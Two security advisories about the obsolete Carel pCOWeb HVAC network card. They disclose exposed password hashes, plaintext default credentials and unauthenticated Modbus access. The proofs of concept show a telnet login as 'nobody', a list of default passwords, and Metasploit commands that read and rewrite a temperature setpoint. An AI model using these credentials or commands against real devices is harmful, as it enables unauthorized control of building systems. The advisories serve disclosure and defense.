Advisory: Unsafe Storage of Credentials in Carel pCOWeb HVAC
The Carel pCOWeb card stores password hashes in the file "/etc/passwd",
allowing privilege escalation by authenticated users. Additionally,
plaintext copies of the passwords are stored.
### Details
- Product: HVAC units using the OEM Carel pCOWeb Ethernet Control Interface
- Affected Versions: "A 1.4.11 - B 1.4.2", possibly others
- Fixed Versions: product obsolete
- Vulnerability Type: Credential Disclosure / Privilege Escalation
- Security Risk: low
- Vendor URL: `https://www.carel.com/product/pcoweb-card`
- Vendor Status: notified / product obsolete
- Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2019-013`
- Advisory Status: published
- CVE: GENERIC-MAP-NOMATCH
- CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH`
### Introduction
"The pCOWeb card is used to interface the pCO Sistema to networks that
use the HVAC protocols based on the Ethernet physical standard, such as
BACnet IP, Modbus TCP/IP and SNMP. The card also features an integrated
Web-Server, which both contains the HTML pages relating to the specific
application and allows a browser to be used for remote system
management."
(from the vendor's homepage)
It is used as an OEM module in several different HVAC systems and
considered obsolete by the vendor.
### More Details
The Carel pCOWeb interface provides user accounts with different levels
of privileges. Despite the different privileges, other users, even the
user nobody, are able to read the file "/etc/passwd" which contains the
hashed passwords for all user accounts, especially those with more
privileges. Additionally, a plaintext copy of all passwords is stored in
the file /usr/local/root/flash/etc/sysconfig/userspwd, which is
accessible from the web interface at the URL
`http://192.168.0.1/config/pw\_changeusers.html`
This allows attackers with knowledge of one user account password to
gain knowledge of the other accounts passwords, possibly gaining more
privileges.
### Proof of Concept
Apart from a web interface, the Carel pCOWeb card provides a telnet
interface accessible using a variety of default passwords and, in some
cases, the user "nobody" without password:
```
$ telnet 192.168.0.1
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
Linux 2.4.21-rmk1 (pCOWeb) (ttya0)
pCOWeb login: nobody
No directory /var/lib/nobody!
Logging in with home = "/".
Executing profile
/usr/local/bin:/bin:/usr/bin
[nobody@pCOWeb13:58:55 /]$ ls -la /etc/passwd
-rw-r--r-- 1 root root 317 Jan 1 00:00 /etc/passwd
[nobody@pCOWeb13:59:00 /]$ cat /etc/passwd
root:o4jAwxNRjdSSk:0:0:root:/root:/bin/bash
http::48:48:HTTP users:/usr/http/root:/bin/bash
nobody::99:99:nobody:/var/lib/nobody:/bin/bash
httpadmin:p4erNF6yyLx0U:200:200:httpadmin:/usr/local/root/http:/bin/bash
carel:f4msfA.Ljf2Fo:500:500:carel:/home:/bin/bash
guest:d4iIyYc5JrnxM:502:101:guest:/usr/bin:/bin/bash
[nobody@pCOWeb13:59:32 /]$ cat /usr/local/root/admin/.htpasswd
admin:7c3fxxrcHcwtc
[nobody@pCOWeb13:59:33 /]$
```
The following table lists the cleartext passwords for above
password hashes:
> ## username \| password
>
> root \| froot
> httpadmin \| fhttpadm
> carel \| fcarel
> guest \| fguest
> nobody \| (none)
> admin \| fadmin
The passwords for the useraccounts "root", "httpadmin", "carel" and
"guest" are documented in section 9.7.2 of the user manual (), warning
users:
> "it is important to set a password other than the default "froot" to
> prevent potentially dangerous outside access."
It is possible that these default credentials are covered in
CVE-2019-13553. Depending on firmware version and/or OEM modifications,
some versions additionally allow Telnet login without password with the
username "nobody" while it is disabled for other versions.
The password for the web interface user "admin" is documented in section
9.2.1 of the user manual ().
Additionally, some versions were seen with additional user credentials
stored in the directory provided for OEM modifications of the web
interface, such as the username "reserved" with the password "freserve"
in "/usr/local/root/flash/http/reserved/.htpasswd".
Storing some of these passwords in plaintext is covered in
CVE-2019-11369.
However, while the above passwords are stored in hashed form, the web
interface at `http://192.168.0.1/config/pw\_changeusers.html` shows them in
plaintext. A file containing the plaintext passwords can be found in the
filesystem:
```
[root@pCOWeb14:02:14 /]# cat /usr/local/root/flash/etc/sysconfig/userspwd
PROOT=froot
PHTTP=fhttpadmin
PGUEST=fguest
PCAREL=fcarel
```
### Workaround
Change all default passwords listed above and ensure the user "nobody"
is disabled or has a password set.
The Carel pCOWeb card should not be connected to networks accessible by
untrusted users (compare advisory rt-sa-2019-014 ()).
### Fix
No updated firmware will be published for pCOWeb Cards, as they are
obsolete since Dec 2017. A successor hardware with current firmware is
available for OEM integrators.
### Security Risk
Attackers with knowledge of one set of user credentials to a Carel
pCOWeb card could use the password hashes accessible to all users in
"/etc/passwd" or the plaintext copies of the passwords to gain
different privileges. Due to the necessity of access to credentials,
this is considered to pose a low risk only.

Advisory: Unauthenticated Access to Modbus Interface in Carel pCOWeb HVAC

As part of it's features, the Carel pCOWeb card exposes a Modbus
interface to the network. By design, Modbus does not provide
authentication, allowing to control the affected system.

Details
=======

Product: HVAC units using the OEM Carel pCOWeb Ethernet Control Interface
Affected Versions: "A 1.4.11 - B 1.4.2", possibly others
Fixed Versions: product obsolete
Vulnerability Type: Unauthenticated Access
Security Risk: high
Vendor URL: <https://www.carel.com/product/pcoweb-card>
Vendor Status: notified / product obsolete
Advisory URL: <https://www.redteam-pentesting.de/advisories/rt-sa-2019-14>
Advisory Status: published
CVE: GENERIC-MAP-NOMATCH
CVE URL: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH>

Introduction
============

"The pCOWeb card is used to interface the pCO Sistema to networks that
use the HVAC protocols based on the Ethernet physical standard, such as
BACnet IP, Modbus TCP/IP and SNMP. The card also features an integrated
Web-Server, which both contains the HTML pages relating to the specific
application and allows a browser to be used for remote system
management."
(from the vendor's homepage)

It is used as an OEM module in several different HVAC systems and
considered obsolete by the vendor.

More Details
============

While authentication is required to access the web interface (compare
advisory rt-sa-2019-013 [0]) no authentication is necessary for using
the Modbus interface on TCP port 502, since the Modbus protocol did not
offer any authentication mechanism during the device's lifetime.
The addition of encryption and authentication was only recently proposed
by the Modbus Organization [1].

It is believed that this might be analogous to the problem described in
CVE-2019-13549 for the special case of Rittal SK 3232 products. Other
OEMs are affected, too.

Proof of Concept
================

The web interface of the Carel pCOWeb card allows authenticated users to
read and write many variables of the system via the URL

<http://192.168.0.1/config/adminpage.html>

This web page seems to provide access to all Modbus variables using
large tables of variables 1-207 for digital, analog and integer
variables, respectively.

By accessing TCP port 502 (Modbus to TCP), it is possible to access
these variables without authentication. This can be done, for example,
by using the Metasploit [2] modbusclient [3] module:

------------------------------------------------------------------------
msf5 > use auxiliary/scanner/scada/modbusclient
msf5 auxiliary(scanner/scada/modbusclient) > set RHOSTS 192.168.0.1
RHOSTS => 192.168.0.1
msf5 auxiliary(scanner/scada/modbusclient) > set DATA_ADDRESS 10
DATA_ADDRESS => 10
msf5 auxiliary(scanner/scada/modbusclient) > run

[*] 192.168.0.1:502 - Sending READ REGISTERS...
[+] 192.168.0.1:502 - 1 register values from address 10 :
[+] 192.168.0.1:502 - [240]
[*] Auxiliary module execution completed
------------------------------------------------------------------------

The returned value matches the set temperature of 24°C multiplied by
ten, as the variable can only hold integers. Using the same module, it
is possible to change the temperature setpoint, too:

------------------------------------------------------------------------
msf5 auxiliary(scanner/scada/modbusclient) > set ACTION WRITE_REGISTER
ACTION => WRITE_REGISTER
msf5 auxiliary(scanner/scada/modbusclient) > set DATA 241
DATA => 241
msf5 auxiliary(scanner/scada/modbusclient) > run

[*] 192.168.0.1:502 - Sending WRITE REGISTER...
[+] 192.168.0.1:502 - Value 241 successfully written at registry address 10
[*] Auxiliary module execution completed
------------------------------------------------------------------------

This allows unauthenticated remote attackers to reconfigure the device.

Depending on OEM integration, different variables might represent
different settings.

Additionally, the system provides SNMP (UDP Port 161) write access with
the SNMP community string "public" or "carel" (depending on version) as
documented in the manual [4] and BACnet over IP (UDP Port 47808).

Workaround
==========

The Carel pCOWeb card should not be connected to networks accessible by
untrusted users.

Fix
===

No updated firmware will be published for pCOWeb Cards, as they are
obsolete since Dec 2017. A successor hardware with current firmware is
available for OEM integrators.

Security Risk
=============

Since the Modbus protocol implemented in the Carel pCOWeb card does not
offer auhtentication, it is not possible to limit access to the system
to authorized users, allowing attackers to control the system if the
device is accessible via the network. This is considered to pose a high
risk in context of the Carel pCOWeb card.
